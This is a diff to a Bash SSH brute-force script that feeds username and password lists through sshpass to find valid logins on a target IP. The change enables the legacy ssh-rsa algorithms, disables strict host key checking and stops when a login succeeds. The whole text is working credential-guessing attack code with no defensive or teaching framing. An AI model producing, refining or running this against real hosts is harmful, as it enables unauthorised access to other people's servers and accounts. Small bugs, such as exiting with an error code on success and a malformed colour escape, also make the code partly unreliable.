@@ -49,21 +49,17 @@ done < ${pass_path}
 # Brute forcer
 for ((i=0; i<${#username_arr[@]}; i++)); do
 	for ((j=0; j<${#password_arr[@]}; j++)); do
+		echo ""
 		echo "Trying: ${username_arr[$i]}:${password_arr[$j]}"
-		result=$(sshpass -p "${password_arr[$j]}" ssh -oHostKeyAlgorithms=+ssh-dss "${username_arr[$i]}"@"$ip" whoami 2>&1)
-		
+		result=$(sshpass -p "${password_arr[$j]}" ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o StrictHostKeyCHecking=no "${username_arr[$i]}"@"${ip}" whoami 2>&1)
+		echo "$result"		
 		if [[ "${result}" == "${username_arr[$i]}" ]]; then
 			echo ""
 			echo $'\033[0;32msucces! \e[0m' $'\n'"Username = ${username_arr[$i]}" $'\n'"Password = ${password_arr[$j]}"
-			succes_checker=true
-			break 2
-		else
-			echo $'\033[0;31mPermission denied \e[0m'
+			exit 1	
 		fi
 	done
 done
 
-if [[ ${succes_checker} != true ]]; then
-	echo ""
-	echo $'\033[0;31Failed!\e[0m No usernames or passwords was found.'
-fi
+echo ""
+echo $'\033[0;31Failed!\e[0m No usernames or passwords was found.'
